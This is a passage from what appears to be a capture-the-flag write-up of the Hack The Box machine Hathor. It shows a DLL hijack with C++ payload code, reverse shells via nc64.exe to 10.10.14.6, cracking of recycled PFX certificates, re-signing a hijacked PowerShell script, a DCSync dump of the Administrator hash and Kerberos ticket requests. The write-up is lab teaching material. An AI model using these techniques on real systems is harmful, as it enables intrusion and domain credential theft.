I’ll connect to the `share` share with `smbclient` see what’s there. The root has two executables and folder:

```

oxdf@hacky$ smbclient //hathor.windcorp.htb/share -U beatricemill@windcorp.htb -N -k 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Nov  9 21:01:36 2022
  ..                                DHS        0  Tue Apr 19 12:45:15 2022
  AutoIt3_x64.exe                     A  1013928  Thu Mar 15 13:17:44 2018
  Bginfo64.exe                        A  4601208  Thu Sep 19 20:15:38 2019
  scripts                             D        0  Mon Mar 21 21:22:59 2022

                10328063 blocks of size 4096. 2261735 blocks available

```

[AutoIt](https://www.autoitscript.com/site/) is a automation framework for controlling the Windows GUI. [BgInfo](https://learn.microsoft.com/en-us/sysinternals/downloads/bginfo) is a Windows SysInternals tool for printing information about a host onto the host’s wallpaper. I’ll remember that Bginfo at this path is whitelisted with AppLocker, and that AutoIt is blocked at the firewall.

In `scripts`, there’s a 7Zip library and a bunch of AutoIt scripts:

```

smb: \scripts\> ls
  .                                   D        0  Mon Mar 21 21:22:59 2022
  ..                                  D        0  Wed Nov  9 21:01:36 2022
  7-zip64.dll                         A  1076736  Mon Mar 21 13:43:58 2022
  7Zip.au3                            A    54739  Thu Oct 18 20:02:02 2012
  ZipExample.zip                      A     2333  Sat Oct  6 21:50:30 2012
  _7ZipAdd_Example.au3                A     1794  Sun Oct  7 11:15:16 2012
  _7ZipAdd_Example_using_Callback.au3      A     1855  Sun Oct  7 11:17:14 2012
  _7ZipDelete_Example.au3             A      334  Sun Oct  7 01:37:38 2012
  _7ZIPExtractEx_Example.au3          A      859  Sun Oct  7 01:38:10 2012
  _7ZIPExtractEx_Example_using_Callback.au3      A     1867  Sat Oct  6 23:04:14 2012
  _7ZIPExtract_Example.au3            A      830  Sun Oct  7 01:37:50 2012
  _7ZipFindFirst__7ZipFindNext_Example.au3      A     2027  Sat Oct  6 23:05:12 2012
  _7ZIPUpdate_Example.au3             A      372  Sun Oct  7 01:39:04 2012
  _Archive_Size.au3                   A      886  Sun Jan 23 09:51:45 2022
  _CheckExample.au3                   A      201  Sat Oct  6 23:51:30 2012
  _GetZipListExample.au3              A      144  Sun Oct  7 01:39:22 2012
  _MiscExamples.au3                   A      498  Thu Nov 27 16:04:30 2008

                10328063 blocks of size 4096. 2261721 blocks available

```

This `7-zip64.dll` is also whitelisted by applocker.

### Find Running Processes

I’m curious to know if either of these files is running on Hathor. With my shell as web, I’ll write a ugly but effective loop that will check the process list for both AutoIt and BgInfo. First, I’ll run `echo off`. This will prevent it from printing the commands as they run. It also gets rid of the command prompt.

Then I’ll run this as a one-liner:

```

FOR /L %i IN (0,1,1000) DO (tasklist /FI "imagename eq Bginfo64.exe" | findstr /v "No tasks" & tasklist /FI "imagename eq AutoIt3_x64.exe" | findstr /v "No tasks"  & ping -n 2 127.0.0.1 > NUL )

```

With whitespace added, that’s:

```

FOR /L %i IN (0,1,1000) DO (
  tasklist /FI "imagename eq Bginfo64.exe" | findstr /v "No tasks" & 
  tasklist /FI "imagename eq AutoIt3_x64.exe" | findstr /v "No tasks" & 
  ping -n 2 127.0.0.1 > NUL 
)

```

It’s looking at the tasklist for each of the exes, then using `findstr` to remove lines that say “No tasks found”. Then it pings itself as a sleep, and runs again. It does this 1000 times. Every three minutes or so, there’s a bunch of each process:

```

...[snip]...
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
AutoIt3_x64.exe              19676                            1     11,856 K

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
Bginfo64.exe                 25352                            1     20,392 K
...[snip]...

```

After ~30 seconds of `AutoIt3_x64.exe`, there’s about 10 seconds of `Bginfo64.exe`.

### Overwrite Exe - Fail

My first thought here is to try to overwrite one of these binaries. To test this, I’ll try writing `nc64.exe`. I don’t expect this to get me a shell (the task is running it without the arguments necessary to get a connection back to me), but at least it will show me if I can overwrite these. Both fail:

```

smb: \> put nc64.exe AutoIt3_x64.exe
NT_STATUS_ACCESS_DENIED opening remote file \AutoIt3_x64.exe
smb: \> put nc64.exe Bginfo64.exe
NT_STATUS_ACCESS_DENIED opening remote file \Bginfo64.exe

```

In fact, just trying to write `nc64.exe` to the share fails, but writing the same file as `nc64.txt` works:

```

smb: \> put nc64.exe 
NT_STATUS_ACCESS_DENIED opening remote file \nc64.exe
smb: \> put nc64.exe nc64.txt
putting file nc64.exe as \nc64.txt (40.1 kb/s) (average 40.1 kb/s)
smb: \> ls
  .                                   D        0  Wed Nov  9 22:57:42 2022
  ..                                DHS        0  Tue Apr 19 12:45:15 2022
  AutoIt3_x64.exe                     A  1013928  Thu Mar 15 13:17:44 2018
  Bginfo64.exe                        A  4601208  Thu Sep 19 20:15:38 2019
  nc64.txt                            A    45272  Wed Nov  9 22:57:42 2022
  scripts                             D        0  Mon Mar 21 21:22:59 2022

                10328063 blocks of size 4096. 2255724 blocks available

```

Clearly it’s blocking uploading of files that have the `exe` extension.

### Execution via DLL Overwrite

#### Show Possible

Interestingly, it isn’t blocking the upload of DLLs:

```

smb: \> put nc64.exe nc64.dll
putting file nc64.exe as \nc64.dll (87.9 kb/s) (average 55.1 kb/s)

```

I can even overwrite `7-zip64.dll`:

```

smb: \scripts\> ls 7-zip64.dll
  7-zip64.dll                         A  1076736  Mon Mar 21 13:43:58 2022
smb: \scripts\> put nc64.exe 7-zip64.dll
putting file nc64.exe as \scripts\7-zip64.dll (87.2 kb/s) (average 62.8 kb/s)
smb: \scripts\> ls 7-zip64.dll 
  7-zip64.dll                         A    45272  Wed Nov  9 23:02:34 2022

```

#### Show Use

Before I go creating a DLL, I’ll take a look at some of these AutoIt scripts to see if they use the dll. On downloading some and looking, there’s references to it in `7Zip.au3`:

[![image-20221109181013327](https://0xdfimages.gitlab.io/img/image-20221109181013327.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221109181013327.png)

So if this AutoIt script is run, it’s likely that this DLL will be loaded.

#### msfvenom Fail

I don’t expect an MSF generated reverse shell to connect back for a couple reasons. First, Defender seems like it’s enabled on this box, and I would expect it to eat anything generated by MSF. Second, the Dll would be loaded into the AutoIt process, which is blocked outbound by the firewall.

Still, I’ll give it a try anyway because it only takes a minute and if I’m wrong, it would save a lot of time. I’ll generate a Dll reverse shell with `msfvenom`:

```

oxdf@hacky$ msfvenom -p windows/x64/shell_reverse_tcp -f dll LHOST=10.10.14.6 LPORT=443 >
 rev.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 8704 bytes

```

I’ll upload this, and it seems to be there. However, when the scheduled task runs, I don’t get a callback, and the DLL is gone. This is almost certainly defender removing it. A bit later, the original is back.

#### Generate DLL - ping

I’ve written my own DLL a few times before. The most detailed writeup I have is from [HackBack](/2019/07/06/htb-hackback.html#dll). I’ll follow the same process here. I’ll open my Windows VM and Visual Studio. I’ll create a new project, filtering for C++ and selecting “Dynamic-Link Library (DLL)” as the type:

[![image-20221110073725689](https://0xdfimages.gitlab.io/img/image-20221110073725689.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221110073725689.png)

After giving it a name, it’ll open with `dllmain.cpp` showing. I’ll add an `include` for `stdlib.h` to get access to the `system` function, and update the `DLL_PROCESS_ATTACH` case with my payload:

```

// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <stdlib.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        system("cmd.exe /c ping 10.10.14.6");
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```

Given the complexity of what’s going on, I’m going to start with a simple `ping` to my host. I’ll set the build to Release x64, and select Build -> Build Solution.

![image-20221110073913824](https://0xdfimages.gitlab.io/img/image-20221110073913824.png)

It’s successful.

I’ll start `tcpdump` to look for ICMP packets, and upload this over `7-zip.dll`, and wait for the next scheduled task run. It works:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
12:39:57.992781 IP 10.10.11.147 > 10.10.14.6: ICMP echo request, id 3, seq 18400, length 40
12:39:57.992824 IP 10.10.14.6 > 10.10.11.147: ICMP echo reply, id 3, seq 18400, length 40
12:39:59.007392 IP 10.10.11.147 > 10.10.14.6: ICMP echo request, id 3, seq 18402, length 40
12:39:59.007425 IP 10.10.14.6 > 10.10.11.147: ICMP echo reply, id 3, seq 18402, length 40
12:40:00.039137 IP 10.10.11.147 > 10.10.14.6: ICMP echo request, id 3, seq 18404, length 40
12:40:00.039167 IP 10.10.14.6 > 10.10.11.147: ICMP echo reply, id 3, seq 18404, length 40
12:40:01.054422 IP 10.10.11.147 > 10.10.14.6: ICMP echo request, id 3, seq 18406, length 40
12:40:01.054468 IP 10.10.14.6 > 10.10.11.147: ICMP echo reply, id 3, seq 18406, length 40

```

So that’s execution.

### Enumeration Via Dll

To get a feel about where to go next, I’m going to get more information about the share by having the Dll write data to a file and read it via the shell as web. I’ll generate a new Dll body:

```

    case DLL_PROCESS_ATTACH:
        system("cmd.exe /c whoami /all > C:\\users\\public\\0xdf.txt");
        system("cmd.exe /c icacls C:\\share >> C:\\users\\public\\0xdf.txt");
        system("cmd.exe /c icacls C:\\share\\* >> C:\\users\\public\\0xdf.txt");
        system("cmd.exe /c icacls C:\\share\\scripts\\* >> C:\\users\\public\\0xdf.txt");
        system("cmd.exe /c ping 10.10.14.6");

```

I’m leaving the `ping` in there so that I have some indication when it runs.

I’ll upload it, and after a minute or so, I get pings. I’ll check with the shell, and there’s a file:

```

c:\Users\Public>dir
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of c:\Users\Public

11/10/2022  07:40 PM    <DIR>          .
02/16/2022  10:00 PM    <DIR>          ..
11/10/2022  07:40 PM            11,072 0xdf.txt
09/24/2021  07:27 AM    <DIR>          Documents
09/15/2018  08:19 AM    <DIR>          Downloads
09/15/2018  08:19 AM    <DIR>          Music
09/15/2018  08:19 AM    <DIR>          Pictures
09/15/2018  08:19 AM    <DIR>          Videos
               1 File(s)         11,072 bytes
               7 Dir(s)   9,227,177,984 bytes free 

```

The file looks to be owned by GinaWild:

```

c:\Users\Public>icacls 0xdf.txt
icacls 0xdf.txt
0xdf.txt BUILTIN\Administrators:(I)(F)
         WINDCORP\GinaWild:(I)(F)
         NT AUTHORITY\SYSTEM:(I)(F)
         NT AUTHORITY\INTERACTIVE:(I)(M,DC)
         NT AUTHORITY\SERVICE:(I)(M,DC)
         NT AUTHORITY\BATCH:(I)(M,DC)

Successfully processed 1 files; Failed processing 0 files

```

Looking at the output, a few things jump out. The user running it is GinaWild, and they are a member of the ITDep and Protected Users groups:

![image-20221110134404933](https://0xdfimages.gitlab.io/img/image-20221110134404933.png)

Looking at the permissions in `C:\share`, several results jump out as interesting. `7-zip64.dll` is writable by all users, which explains why I can overwrite it:

![image-20221110134740278](https://0xdfimages.gitlab.io/img/image-20221110134740278.png)

`AutoIt3_x64.exe` is owned by Administrator, and users can only read / execute. The ITDep group (which GinaWild is in) can also delete children (`DC`):

![image-20221110134923892](https://0xdfimages.gitlab.io/img/image-20221110134923892.png)

`Bginfo64.exe`, on the other hand, is more permissive. Users can only read / execute, but ITDep can also write owner (`WO`), which means ginawild can change the owner.

### Shell

#### Strategy

`Bginfo64.exe` is not blocked at the firewall, and it whitelisted in AppLocker to run even if unsigned from that path. I can run Dlls as GinaWild, and GinaWild can take ownership of `Bginfo64.exe`, and then modify it.

I’ll craft a new Dll to:
- Take ownership of `Bginfo64.exe`.
- Update the permissions so that GinaWild has full control.
- Copy the `nc64.exe` I uploaded earlier to the web directory over `Bginfo64.exe`.
- Invoke `nc64.exe` to connect back to me with a reverse shell.

#### Dll

I’ll update my Dll code to do the steps above:

```

    case DLL_PROCESS_ATTACH:
        system("cmd.exe /c takeown /F C:\\share\\Bginfo64.exe");
        system("cmd.exe /c cacls C:\\share\\Bginfo64.exe /E /G ginawild:F");
        system("cmd.exe /c copy C:\\inetpub\\wwwroot\\data\\sites\\1\\media\\nc64.exe C:\\share\\Bginfo64.exe");
        system("cmd.exe /c C:\\share\\Bginfo64.exe -e cmd 10.10.14.6 9003");

```

For `takeown`, the syntax is `/f [filename]` ([docs](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown)).

For `cacls`, `/E` says “edit ACL instead of replacing it”, and `/G [user:<perm>]` grants the specified rights to that user. So in this case, full control to GinaWild ([docs](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cacls)).

#### Shell

I’ll upload that Dll over `7-zip64.dll` and wait. When the task runs, there’s a connect at my listening `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 9003
Listening on 0.0.0.0 9003
Connection received on 10.10.11.147 56824
Microsoft Windows [Version 10.0.20348.643]
(c) Microsoft Corporation. All rights reserved.

c:\share>

```

And I can finally get `user.txt`:

```

c:\Users\GinaWild\Desktop>type user.txt
c7de9935************************

```

## Shell as bpassrunner

### Enumeration

#### Desktop Link

There’s not much else in GinaWild’s home directory, but there is a file worth noting in `C:\Users\Public\Desktop`:

```

c:\Users\Public\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of c:\Users\Public\Desktop

11/10/2022  07:40 PM    <DIR>          ..
03/18/2022  01:19 PM             1,111 bAD Passwords.lnk
               1 File(s)          1,111 bytes
               1 Dir(s)   9,230,606,336 bytes free

```

Files in this folder will appear on any user’s desktop.

[This StackOverFlow post](https://stackoverflow.com/a/42762873) show how to get the target using PowerShell:

```

c:\Users\Public\Desktop>powershell -c "$sh = New-Object -ComObject WScript.Shell; $sh.CreateShortcut('.\bAD Passwords.lnk').TargetPath"
C:\Get-bADpasswords\run.vbs

```

I actually looked at that script [above](#get-badpasswords). It creates an Event Log, and is signed. I’ll run it, and note that there’s a new `.csv` file in `C:\Get-bADpasswords\Accessible\CSVs` with a modified stamp a few seconds ago.

#### Recycle Bin

There are files in GinaWild’s recycle bin. In `C:\$Recycle.Bin`, there are hidden directories (view able with `/a` in `dir`) for each user who has deleted something:

```

c:\$Recycle.Bin>dir /a
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of c:\$Recycle.Bin

02/14/2022  07:48 PM    <DIR>          .
04/19/2022  01:45 PM    <DIR>          ..
02/14/2022  07:48 PM    <DIR>          S-1-5-18
10/06/2021  11:51 PM    <DIR>          S-1-5-21-3783586571-2109290616-3725730865-2359
10/13/2022  08:11 PM    <DIR>          S-1-5-21-3783586571-2109290616-3725730865-2663
10/13/2022  08:05 PM    <DIR>          S-1-5-21-3783586571-2109290616-3725730865-500
               0 File(s)              0 bytes
               6 Dir(s)   9,231,273,984 bytes free

```

GinaWild’s SID ends in `-2663` (from `whoami /all` run via Dll above). I can’t access any of the other directories, but I can get into that one. It contains three `.pfx` files:

```

c:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663>dir
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of c:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663

10/12/2022  08:26 PM                98 $IZIX7VV.pfx
03/21/2022  03:37 PM             4,053 $RLYS3KF.pfx
10/12/2022  07:43 PM             4,280 $RZIX7VV.pfx
               3 File(s)          8,431 bytes
               0 Dir(s)   9,232,101,376 bytes free

```

Files in the recycle bin are stored with names starting with `$R`, and associated metadata starting with `$I`. So `$IZIX7VV.pfx` is the metadata for `$RZIX7VV.pfx`, and for some reason, `$RLYS3KF.pfx` is missing metadata.

The metadata file is a binary format, but I can see the string of the former file name:

```

c:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663>type $IZIX7VV.pfx
ўp#C:\Users\GinaWild\Desktop\cert.pfx

```

That’s definitely interesting.

### Access Certificate

#### Download

I’ll copy all three files into the SMB share:

```

c:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663>copy * \share\
$IZIX7VV.pfx
$RLYS3KF.pfx
$RZIX7VV.pfx
        3 file(s) copied

```

I’ll download the files over SMB and delete them from the share to clean up after myself.

All three files are just `data`:

```

oxdf@hacky$ file \$IZIX7VV.pfx 
$IZIX7VV.pfx: data
oxdf@hacky$ file \$RLYS3KF.pfx 
$RLYS3KF.pfx: data
oxdf@hacky$ file \$RZIX7VV.pfx 
$RZIX7VV.pfx: data

```

Still, knowing the file name, if I try to get information about the certificate from `openssl` for either `.pfx` file, it asks for a password:

```

oxdf@hacky$ openssl pkcs12 -info -in \$RZIX7VV.pfx -noout
Enter Import Password:
MAC: sha1, Iteration 2000
MAC length: 20, salt length: 20
Mac verify error: invalid password?
oxdf@hacky$ openssl pkcs12 -info -in \$RLYS3KF.pfx -noout
Enter Import Password:
MAC: sha1, Iteration 2048
MAC length: 20, salt length: 8
Mac verify error: invalid password?

```

#### Crack

There’s a tool called [crackpkcs12](https://github.com/crackpkcs12/crackpkcs12) that will attempt to brute force these passwords. I’ll clone the repo to my host, and run the install instructions from the README. This installs `crackpkcs12` in my path so I can use it anywhere.

The file without metadata cracks in a couple seconds:

```

oxdf@hacky$ crackpkcs12 -d /usr/share/wordlists/rockyou.txt \$RLYS3KF.pfx 

Dictionary attack - Starting 4 threads
*********************************************************
Dictionary attack - Thread 3 - Password found: abceasyas123
*********************************************************

```

The other runs for about two minutes and then cracks:

```

oxdf@hacky$ time crackpkcs12 -d /usr/share/wordlists/rockyou.txt \$RZIX7VV.pfx 

Dictionary attack - Starting 4 threads
*********************************************************
Dictionary attack - Thread 2 - Password found: whysoeasy?
*********************************************************

real    2m0.411s
user    8m0.834s
sys     0m0.104s

```

#### Extract Certificate

Now I can read both:

```

oxdf@hacky$ openssl pkcs12 -info -in \$RLYS3KF.pfx -noout
Enter Import Password:
MAC: sha1, Iteration 2048
MAC length: 20, salt length: 8
PKCS7 Encrypted data: pbeWithSHA1And40BitRC2-CBC, Iteration 2048
Certificate bag
Certificate bag
PKCS7 Data
Shrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2048
oxdf@hacky$ openssl pkcs12 -info -in \$RLYS3KF.pfx -noout
Enter Import Password:
MAC: sha1, Iteration 2048
MAC length: 20, salt length: 8
PKCS7 Encrypted data: pbeWithSHA1And40BitRC2-CBC, Iteration 2048
Certificate bag
Certificate bag
PKCS7 Data
Shrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2048

```

I’ll pull the certificate from the `.pfx` file:

```

oxdf@hacky$ openssl pkcs12 -in \$RLYS3KF.pfx -out cert.pem -nokeys
Enter Import Password:

```

I’ll view the data using `openssl` as well:

```

oxdf@hacky$ openssl x509 -in cert.pem -noout -text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            20:00:00:00:05:44:ed:aa:28:b6:36:dd:dc:00:00:00:00:00:05
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: DC = htb, DC = windcorp, CN = windcorp-HATHOR-CA-1
        Validity
            Not Before: Mar 18 09:03:11 2022 GMT
            Not After : Mar 15 09:03:11 2032 GMT
        Subject: DC = htb, DC = windcorp, CN = Users, CN = Administrator
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:dc:a6:3e:fe:7f:96:b3:a2:11:df:ce:d5:23:88:
...[snip]...
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            1.3.6.1.4.1.311.21.7: 
                0..&+.....7.....p...h......./...d.*..<...m..e...
            X509v3 Extended Key Usage: 
                Code Signing
            X509v3 Key Usage: critical
                Digital Signature
            1.3.6.1.4.1.311.21.10: 
                0.0
..+.......
            X509v3 Subject Key Identifier: 
                FD:A4:0D:4B:EC:9D:BD:B7:79:0D:F8:C3:95:5E:95:5E:8D:5F:DE:36
            X509v3 Authority Key Identifier: 
                keyid:F1:8E:4A:A4:6D:CD:82:B0:69:5D:62:F3:63:9A:7E:8B:6E:72:F6:59

            X509v3 CRL Distribution Points: 

                Full Name:
                  URI:ldap:///CN=windcorp-HATHOR-CA-1,CN=hathor,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=windcorp,DC=htb?certificateRevocationList?base?objectClass=cRLDistributionPoint

            Authority Information Access: 
                CA Issuers - URI:ldap:///CN=windcorp-HATHOR-CA-1,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=windcorp,DC=htb?cACertificate?base?objectClass=certificationAuthority

            X509v3 Subject Alternative Name: 
                othername:<unsupported>
    Signature Algorithm: sha256WithRSAEncryption
         76:b1:02:41:59:6d:63:8f:23:28:7f:5d:1c:73:a3:2e:6f:7e:
...[snip]...

```

Key bits of information:
- The subject is `DC = htb, DC = windcorp, CN = Users, CN = Administrator`. This matches what was in the AppLocker data above for Exe (not shown) and Script:

  ![image-20221110154222397](https://0xdfimages.gitlab.io/img/image-20221110154222397.png)

</picture>
- The certificate is used for code signing:

  ```

  X509v3 Extended Key Usage: 
  	Code Signing
  X509v3 Key Usage: critical
  	Digital Signature

  ```

### Hijack Get-bADpasswords

#### Strategy

The `Get-bADpasswords` script must have access to the domain passwords to do it’s job, so it’s very likely run as some kind of privileged user. I know it runs the `C:\Get-bADpasswords.ps1` script, which is signed so it will run. I know have access to the signing key, so in theory I can modify the script and get execution.

#### Modify Script

I’ll copy `Get-bADpasswords.ps1` into the SMB share to get a copy of it. I have to change the extension as `.ps1` is blocked from that folder:

```

c:\Get-bADpasswords>copy Get-bADpasswords.ps1 \share\
Access is denied.
        0 file(s) copied.

c:\Get-bADpasswords>copy Get-bADpasswords.ps1 \share\gbp.txt
        1 file(s) copied.

```

I’ll download the script, and a some line to the top that will print details about the user running the script:

```

whoami /all > C:\Programdata\0xdf.txt

```

I’ll upload that back over SMB, and copy it into place.

#### Sign Script

Now I need to sign the script, because modifying it invalidated the old signature. I’ll first import the certificate into my user’s certificate store and get a reference to it as `$cert`:

```

PS C:\> $pass = ConvertTo-SecureString -String 'abceasyas123' -AsPlainText -Force

PS C:\get-badpasswords> $cert = Import-PfxCertificate -FilePath 'C:\$Recycle.bin\S-1-5-21-3783586571-2109290616-3725730865-2663\$RLYS3KF.pfx' -Password $pass -CertStoreLocation Cert:\CurrentUser\My

PS C:\get-badpasswords> $cert

   PSParentPath: Microsoft.PowerShell.Security\Certificate::CurrentUser\My

Thumbprint                                Subject
----------                                -------
204F12473FD6911584501215758270B25701D049  CN=Administrator, CN=Users, DC=windcorp, DC=htb 

```

Now I can use that to sign the file:

```

PS C:\get-badpasswords> Set-AuthenticodeSignature .\Get-bADpasswords.ps1 $cert
Set-AuthenticodeSignature .\Get-bADpasswords.ps1 $cert

    Directory: C:\get-badpasswords

SignerCertificate                         Status                                 Path
-----------------                         ------                                 ----
204F12473FD6911584501215758270B25701D049  Valid                                  Get-bADpasswords.ps1 

```

#### Trigger Execution

To trigger execution, I’ll run `run.vbs`:

```

PS C:\get-badpasswords> cscript .\run.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.

```

Now there’s a file in `C:\programdata`:

```

PS C:\programdata> ls 0xdf.txt

    Directory: C:\programdata

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/10/2022  10:34 PM           6178 0xdf.txt 

```

It shows the user is not a domain admin, but bpassrunner:

```

PS C:\programdata> cat 0xdf.txt

USER INFORMATION
----------------

User Name            SID                                            
==================== ===============================================
windcorp\bpassrunner S-1-5-21-3783586571-2109290616-3725730865-10102

...[snip]...

```

### Shell

It took me a bit to figure out how to turn this into a shell. I can’t just call `nc64.exe` from the web directory because it won’t pass AppLocker. I can’t use PowerShell because even though I can sign it and it will run, the firewall will block the connections outbound.

Then I realized I could try to overwrite `bginfo64.exe` with `nc64.exe` and run it from there. While trying to do that, it failed because the file was still in use - my current shell! That means it’s actually still `nc64.exe`.

I’ll update the top of my local copy of the script to:

```

C:\share\Bginfo64.exe -e cmd 10.10.14.6 9004

```

I’ll upload it, sign it, and trigger it. And about 15 seconds later, I get a shell:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 9004
Listening on 0.0.0.0 9004
Connection received on 10.10.11.147 62144
Microsoft Windows [Version 10.0.20348.643]
(c) Microsoft Corporation. All rights reserved.

C:\Get-bADpasswords>whoami
windcorp\bpassrunner

```

## Shell as Administrator

### Strategy

The `Get-bADpasswords` [GitHub README](https://github.com/improsec/Get-bADpasswords) says that running it:

> Requires ‘Domain Admin’ privileges or similar, e.g. ‘Domain Controller’ or delegated Domain-level permissions for both “Replicating Directory Changes” and “Replicating Directory Changes All”, to successfully fetch passwords from the Active Directory database.

That means this user should be able to run a DCSync attack.

### DCSync

#### From Shell

This is actually quite easy to do from a shell as the user with privileges using `Get-ADReplAccount`:

```

PS C:\Get-bADpasswords> Get-ADReplAccount -SamAccountName administrator -Server 'hathor.windcorp.htb'
                                                    
DistinguishedName: CN=Administrator,CN=Users,DC=windcorp,DC=htb
Sid: S-1-5-21-3783586571-2109290616-3725730865-500
Guid: 526eb447-7a40-4fe9-b95a-f68e9d78efa1     
SamAccountName: Administrator                  
SamAccountType: User                           
UserPrincipalName:                             
PrimaryGroupId: 513                            
SidHistory:                                    
Enabled: True                                  
UserAccountControl: NormalAccount, PasswordNeverExpires
AdminCount: True
Deleted: False                                 
LastLogonDate: 11/5/2022 12:41:33 PM           
DisplayName:                                   
GivenName:                                     
Surname:                                       
Description: Built-in account for administering the computer/domain
ServicePrincipalName:                          
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, 
SystemAclAutoInherited, DiscretionaryAclProtected, SelfRelative
Owner: S-1-5-21-3783586571-2109290616-3725730865-512                           
Secrets                                        
  NTHash: b3ff8d7532eef396a5347ed33933030f
  LMHash:                                      
  NTHashHistory:          
    Hash 01: b3ff8d7532eef396a5347ed33933030f
...[snip]...

```

There’s the NTHash, b3ff8d7532eef396a5347ed33933030f.

#### Via Injection

If I couldn’t get a shell for some reason, I could still do this via the script injection. I’ll add the following three lines to the start of my local copy of `Get-bADpasswords.ps1`:

```

Start-Transcript -Path 'C:\Programdata\0xdf-transcript.txt'
Get-ADReplAccount -SamAccountName administrator -Server 'hathor.windcorp.htb'
Stop-Transcript

```

This is starting a transcript in the location of my choosing, and then running the same command.

I’ll upload, copy into place, sign, and trigger. `C:\programdata\0xdf-transcript.txt` exists:

```

PS C:\programdata> ls 0xdf-transcript.txt

    Directory: C:\programdata

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/10/2022  11:14 PM           6622 0xdf-transcript.txt 

```

And it has the same information after a transcript header:

```

PS C:\programdata> type 0xdf-transcript.txt
**********************
Windows PowerShell transcript start
Start time: 20221110231446
Username: WINDCORP\bpassrunner
RunAs User: WINDCORP\bpassrunner
Configuration Name:                            
Machine: HATHOR (Microsoft Windows NT 10.0.20348.0)
Host Application: powershell.exe C:\Get-bADpasswords\Get-bADpasswords.ps1
Process ID: 25908                              
PSVersion: 5.1.20348.643                       
PSEdition: Desktop                             
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.20348.643
BuildVersion: 10.0.20348.643                   
CLRVersion: 4.0.30319.42000                    
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************                         
Transcript started, output file is C:\Programdata\0xdf-transcript.txt
                                                    
DistinguishedName: CN=Administrator,CN=Users,DC=windcorp,DC=htb
Sid: S-1-5-21-3783586571-2109290616-3725730865-500
...[snip]...
Owner: S-1-5-21-3783586571-2109290616-3725730865-512 
Secrets
  NTHash: b3ff8d7532eef396a5347ed33933030f
...[snip]...

```

### Kerberos Auth

#### Using ktutil / kinit

I can also use the Linux Kerberos tools to get a ticket as well. I’ll start with `ktutil` ([docs](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/admin_commands/ktutil.html)) to `add_entry` and save it as a keytab file:

```

oxdf@hacky$ ktutil
ktutil:  add_entry -p administrator@WINDCORP.HTB -k 1 -key -e rc4-hmac
Key for administrator@WINDCORP.HTB (hex): b3ff8d7532eef396a5347ed33933030f
ktutil:  write_kt administrator.keytab
ktutil:  exit

```

It’s important that the domain be in all caps matching the realm in the `/etc/krb5.conf` file.

Now I’ll run `kinit` ([docs](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html)) to get a ticket, passing it that file:

```

oxdf@hacky$ kinit -V -k -t administrator.keytab -f administrator@WINDCORP.HTB
Using default cache: /tmp/krb5cc_1000
Using principal: administrator@WINDCORP.HTB
Using keytab: administrator.keytab
Authenticated to Kerberos v5

```

`-k -t [keytab file]` is how that’s passed, and `-f` is to request forwardable tickets.

After that, the ticket is in my local session:

```

oxdf@hacky$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: administrator@WINDCORP.HTB

Valid starting       Expires              Service principal
11/10/2022 22:48:08  11/11/2022 08:48:08  krbtgt/WINDCORP.HTB@WINDCORP.HTB
        renew until 11/11/2022 22:48:07

```

#### Using Impacket

One way to get a local ticket using the hash is with `getTGT.py` (from [Impacket](https://github.com/SecureAuthCorp/impacket)). It takes the account and the credentials (password or hash) and talks to the DC to get a ticket that can be used to authenticate, saving that ticket in `administrator.ccache`:

```

oxdf@hacky$ getTGT.py -hashes :b3ff8d7532eef396a5347ed33933030f windcorp.htb/administrator
Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

